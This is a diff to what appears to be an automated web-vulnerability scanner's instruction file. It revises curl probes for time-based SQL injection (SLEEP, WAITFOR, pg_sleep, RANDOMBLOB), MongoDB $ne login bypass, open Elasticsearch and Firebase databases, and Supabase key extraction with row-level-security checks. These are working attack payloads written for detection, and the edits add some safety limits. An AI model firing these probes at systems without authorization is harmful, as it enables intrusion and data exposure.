@@ -251,27 +251,41 @@ RESP_TRUE=$(curl -s --max-time 10 "{target_url}/{path}?{param}=1 AND 1=1" 2>/dev
 RESP_FALSE=$(curl -s --max-time 10 "{target_url}/{path}?{param}=1 AND 1=2" 2>/dev/null | wc -c)
 # Significant difference in response size indicates SQLi
 
-# Time-based blind detection — multi-DB
+# Baseline latency measurement (must run FIRST — all thresholds are delta-based)
+BASELINE_START=$(date +%s)
+curl -s --max-time 12 "{target_url}/{path}?{param}=1" 2>/dev/null >/dev/null
+BASELINE_END=$(date +%s)
+BASELINE=$((BASELINE_END - BASELINE_START))
+echo "Baseline latency: ${BASELINE}s"
+
 # MySQL/MariaDB
 START=$(date +%s)
-curl -s --max-time 12 "{target_url}/{path}?{param}=1 AND SLEEP(5)--+-" 2>/dev/null >/dev/null
-END=$(date +%s); echo "MySQL SLEEP: $((END-START))s"
+curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+SLEEP(5)--+-" 2>/dev/null >/dev/null
+END=$(date +%s); ELAPSED=$((END-START))
+echo "MySQL SLEEP: ${ELAPSED}s (baseline: ${BASELINE}s)"
+if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: MySQL/MariaDB time-based SQLi"; fi
 
-# MSSQL
+# MSSQL — single-quotes percent-encoded to survive URL parsers
 START=$(date +%s)
-curl -s --max-time 12 "{target_url}/{path}?{param}=1;+WAITFOR+DELAY+'0:0:5'--" 2>/dev/null >/dev/null
-END=$(date +%s); echo "MSSQL WAITFOR DELAY: $((END-START))s"
+curl -s --max-time 12 "{target_url}/{path}?{param}=1%3B+WAITFOR+DELAY+%270%3A0%3A5%27--" 2>/dev/null >/dev/null
+END=$(date +%s); ELAPSED=$((END-START))
+echo "MSSQL WAITFOR DELAY: ${ELAPSED}s"
+if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: MSSQL time-based SQLi"; fi
 
-# PostgreSQL
+# PostgreSQL — single-statement form (compatible with all pg drivers, avoids stacked query restriction)
 START=$(date +%s)
-curl -s --max-time 12 "{target_url}/{path}?{param}=1;+SELECT+pg_sleep(5)--" 2>/dev/null >/dev/null
-END=$(date +%s); echo "PostgreSQL pg_sleep: $((END-START))s"
+curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+1%3D(SELECT+1+FROM+pg_sleep(5))" 2>/dev/null >/dev/null
+END=$(date +%s); ELAPSED=$((END-START))
+echo "PostgreSQL pg_sleep: ${ELAPSED}s"
+if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: PostgreSQL time-based SQLi"; fi
 
-# SQLite (computation-based — no sleep function)
+# SQLite — CPU-bound (5MB — reduced from 50MB to limit DoS risk on constrained servers)
+# WARNING: inherently unreliable on modern hardware; if inconclusive, confirm with boolean test
 START=$(date +%s)
-curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+(SELECT+HEX(RANDOMBLOB(50000000)))!=''" 2>/dev/null >/dev/null
-END=$(date +%s); echo "SQLite RANDOMBLOB: $((END-START))s"
-# If any elapsed >= 5, time-based SQLi confirmed for that DB type
+curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+(SELECT+HEX(RANDOMBLOB(5000000)))!=''" 2>/dev/null >/dev/null
+END=$(date +%s); ELAPSED=$((END-START))
+echo "SQLite RANDOMBLOB: ${ELAPSED}s"
+if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: SQLite time-based SQLi (verify with boolean test)"; fi
 ```
 
 For POST endpoints:
@@ -496,25 +510,45 @@ steps, or elevates privileges without proper validation.
 **MongoDB operator injection (authentication bypass detection)**:
 
 ```bash
-# $ne operator — bypass login if endpoint accepts JSON
-curl -s --max-time 10 -X POST "{login_endpoint}" \
+# Establish baseline: confirm login fails with clearly invalid credentials
+BASELINE_LOGIN=$(curl -s --max-time 10 -X POST "{target_url}/{login_path}" \
   -H "Content-Type: application/json" \
-  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' 2>/dev/null | head -20
+  -d '{"username":"vulchk_nosuchuser_probe","password":"vulchk_nosuchpass_probe"}' 2>/dev/null | head -5)
+echo "MongoDB baseline login response: $BASELINE_LOGIN"
 
-# GET parameter bracket notation — $ne and $regex operators
-curl -s --max-time 10 "{target_url}/{path}?{param}[\$ne]=" 2>/dev/null | head -20
-curl -s --max-time 10 "{target_url}/{path}?{param}[\$regex]=.*" 2>/dev/null | head -20
+# $ne operator injection
+NOSQL_RESP=$(curl -s --max-time 10 -X POST "{target_url}/{login_path}" \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}' 2>/dev/null)
+echo "$NOSQL_RESP" | head -20
+# If HTTP 200 + token returned AND baseline showed failure = MongoDB NoSQL injection (Critical)
+# IMPORTANT: If authentication bypass succeeds, DO NOT use the obtained session/token
+# for further requests — log as finding only. This is active exploitation territory.
 ```
 
-If the POST returns HTTP 200 with an auth token or session, MongoDB NoSQL injection
-confirmed (authentication bypass). If GET returns different content than the baseline,
-NoSQL injection may be present.
+```bash
+# GET baseline for comparison
+NOSQL_BASELINE=$(curl -s --max-time 10 "{target_url}/{path}?{param}=vulchk_nosql_baseline" 2>/dev/null | wc -c)
+# $ne and $regex probes ($ percent-encoded as %24 to prevent shell interpolation)
+NOSQL_NE=$(curl -s --max-time 10 "{target_url}/{path}?{param}[%24ne]=" 2>/dev/null | wc -c)
+NOSQL_REGEX=$(curl -s --max-time 10 "{target_url}/{path}?{param}[%24regex]=.*" 2>/dev/null | wc -c)
+echo "NoSQL GET — baseline: ${NOSQL_BASELINE}B, \$ne: ${NOSQL_NE}B, \$regex: ${NOSQL_REGEX}B"
+# Significant size difference vs baseline = possible NoSQL operator injection
+```
 
 **Elasticsearch exposure detection**:
 
 ```bash
-curl -s --max-time 5 "{target_url}/_cat/indices?v" 2>/dev/null | head -20
-curl -s --max-time 5 "{target_url}/_cluster/health" 2>/dev/null | head -10
+TARGET_HOST=$(echo "{target_url}" | sed 's|https\?://||' | cut -d/ -f1)
+# Proxied on primary domain
+curl -s --max-time 5 "{target_url}/_cat/indices?v" 2>/dev/null | head -5
+curl -s --max-time 5 "{target_url}/_cluster/health" 2>/dev/null | head -3
+# Direct Elasticsearch port
+curl -s --max-time 5 "http://${TARGET_HOST}:9200/_cat/indices?v" 2>/dev/null | head -5
+curl -s --max-time 5 "http://${TARGET_HOST}:9200/_cluster/health" 2>/dev/null | head -3
+# Common path prefixes
+curl -s --max-time 5 "{target_url}/es/_cat/health" 2>/dev/null | head -3
+curl -s --max-time 5 "{target_url}/search/_cat/health" 2>/dev/null | head -3
 ```
 
 HTTP 200 with index/cluster data = unauthenticated Elasticsearch exposure (High/Critical).
@@ -525,64 +559,85 @@ HTTP 200 with index/cluster data = unauthenticated Elasticsearch exposure (High/
 FIREBASE_PROJECT=$(curl -s --max-time 10 "{target_url}" 2>/dev/null | \
   grep -oE '"projectId":\s*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"' | head -1)
 if [ -n "$FIREBASE_PROJECT" ]; then
-  curl -s --max-time 10 "https://${FIREBASE_PROJECT}.firebaseio.com/.json" 2>/dev/null | head -20
+  # Probe a nonexistent path — open DB returns HTTP 200 null, secured DB returns 401/403
+  # This avoids reading actual user data from an open database
+  FB_STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
+    "https://${FIREBASE_PROJECT}.firebaseio.com/.vulchkprobe.json" 2>/dev/null)
+  echo "Firebase open check: HTTP $FB_STATUS"
+  # HTTP 200 = database is publicly accessible — Critical finding
+  # HTTP 401/403 = database is secured
 fi
 ```
 
-HTTP 200 with data from the `.json` endpoint = Firebase open database (Critical).
-
 #### 3m. Supabase-Specific Checks
-
-**Fingerprint Supabase presence**:
 
 ```bash
 SUPABASE_DETECTED=false
 curl -sI --max-time 5 "{target_url}/rest/v1/" 2>/dev/null | grep -qi "content-profile\|postgrest" && SUPABASE_DETECTED=true
 curl -sI --max-time 5 "{target_url}/auth/v1/settings" 2>/dev/null | head -1 | grep -q "^HTTP.*200" && SUPABASE_DETECTED=true
 echo "Supabase detected: $SUPABASE_DETECTED"
-```
 
-**If Supabase detected, run extended checks**:
-
-```bash
 if [ "$SUPABASE_DETECTED" = "true" ]; then
-  # Check for exposed keys in page source
-  ANON_KEY=$(curl -s --max-time 10 "{target_url}" 2>/dev/null | \
-    grep -oE 'eyJ[A-Za-z0-9._-]{100,}' | head -1)
-  SERVICE_KEY_LINE=$(curl -s --max-time 10 "{target_url}" 2>/dev/null | \
-    grep -i "service_role" | head -1)
-  echo "anon key found in source: $([ -n "$ANON_KEY" ] && echo YES || echo no)"
-  echo "service_role reference found: $([ -n "$SERVICE_KEY_LINE" ] && echo YES || echo no)"
-  # service_role key in source = Critical finding
+  PAGE_SOURCE=$(curl -s --max-time 10 "{target_url}" 2>/dev/null)
 
-  # PostgREST schema enumeration with anon key
+  # Anon key: prefer context-aware extraction (known variable names)
+  ANON_KEY=$(echo "$PAGE_SOURCE" | \
+    grep -iE '(supabaseKey|anon_key|SUPABASE_ANON_KEY|anonKey|apiKey)' | \
+    grep -oE 'eyJ[A-Za-z0-9._-]{100,}' | head -1)
+  if [ -z "$ANON_KEY" ]; then
+    ANON_KEY=$(echo "$PAGE_SOURCE" | grep -oE 'eyJ[A-Za-z0-9._-]{100,}' | head -1)
+    [ -n "$ANON_KEY" ] && echo "NOTE: JWT found in source but variable context unknown — verify manually"
+  fi
+
+  # service_role key: verify JWT role claim to reduce false positives
+  SERVICE_ROLE_KEY=$(echo "$PAGE_SOURCE" | grep -i "service_role" | \
+    grep -oE 'eyJ[A-Za-z0-9._-]{100,}' | head -1)
+  if [ -n "$SERVICE_ROLE_KEY" ]; then
+    ROLE_CLAIM=$(echo "$SERVICE_ROLE_KEY" | cut -d'.' -f2 | base64 -d 2>/dev/null | grep -o '"role":"service_role"')
+    if [ -n "$ROLE_CLAIM" ]; then
+      echo "CRITICAL: service_role JWT with verified role claim exposed in source"
+    else
+      echo "NOTE: service_role text near JWT found — role claim unconfirmed, verify manually"
+    fi
+  fi
+  echo "anon key: $([ -n "$ANON_KEY" ] && echo "found (${ANON_KEY:0:10}...)" || echo "not found")"
+
   if [ -n "$ANON_KEY" ]; then
+    # PostgREST schema enumeration
     curl -s --max-time 10 "{target_url}/rest/v1/" \
       -H "apikey: $ANON_KEY" -H "Accept: application/openapi+json" 2>/dev/null | head -50
 
-    # RLS check — HTTP 200 on common tables means RLS is not enforced
+    # RLS check: capture BOTH body and HTTP status to distinguish empty vs populated tables
     for table in users profiles accounts orders; do
-      HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
+      RLS_BODY=$(curl -s --max-time 5 \
+        "{target_url}/rest/v1/${table}?select=*&limit=1" \
+        -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" 2>/dev/null | head -c 200)
+      RLS_HTTP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
         "{target_url}/rest/v1/${table}?select=*&limit=1" \
         -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" 2>/dev/null)
-      echo "RLS check /rest/v1/${table}: HTTP $HTTP_CODE"
+      # [] = RLS enforced (no rows visible). [{...}] = RLS missing or misconfigured.
+      if [ "$RLS_HTTP" = "200" ] && echo "$RLS_BODY" | grep -q '\[{'; then
+        echo "RLS MISSING on /rest/v1/${table}: HTTP 200 with row data — HIGH finding"
+      else
+        echo "RLS check /rest/v1/${table}: HTTP $RLS_HTTP (body prefix: ${RLS_BODY:0:30})"
+      fi
     done
+
+    # Storage public bucket enumeration (only when anon key is available)
+    curl -s --max-time 5 "{target_url}/storage/v1/bucket" \
+      -H "apikey: $ANON_KEY" 2>/dev/null | head -20
   fi
 
-  # Auth settings disclosure
+  # Auth settings disclosure check
   curl -s --max-time 5 "{target_url}/auth/v1/settings" 2>/dev/null | head -30
-
-  # Storage public bucket enumeration
-  curl -s --max-time 5 "{target_url}/storage/v1/bucket" \
-    -H "apikey: ${ANON_KEY:-anonymous}" 2>/dev/null | head -20
 fi
 ```
 
 **Finding criteria**:
-- `service_role` key found in source → **Critical** (full RLS bypass possible)
-- anon key + `/rest/v1/{table}` returns HTTP 200 → **High** (RLS not enforced)
-- Storage public bucket accessible → **Medium–High**
-- anon key in source (intent unclear) → **Low–Medium**
+- `service_role` JWT with verified role claim in source → **Critical**
+- anon key + `/rest/v1/{table}` HTTP 200 with row data → **High** (RLS not enforced)
+- Storage public bucket → **Medium–High**
+- anon key in source (context unclear) → **Low–Medium**
 
 **If intensity is active, STOP HERE and go to Step 5.**
 
